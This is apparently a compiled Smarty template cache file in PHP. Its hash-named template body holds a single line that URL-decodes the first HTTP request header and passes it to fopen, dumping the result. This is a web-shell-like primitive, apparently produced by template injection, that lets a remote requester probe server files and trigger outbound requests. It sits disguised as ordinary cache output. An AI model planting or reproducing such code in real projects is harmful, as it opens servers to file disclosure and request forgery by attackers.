<?php
/* Smarty version 3.1.30, created on 2019-06-23 11:51:23
  from "db3c9f5dbfdb8a91b78502fdc7f03c7c9e97d507" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.30',
  'unifunc' => 'content_5d0f67bb1ad828_46893295',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_5d0f67bb1ad828_46893295 (Smarty_Internal_Template $_smarty_tpl) {
echo var_dump(fopen(urldecode(current(getallheaders())),'r'));
}
}
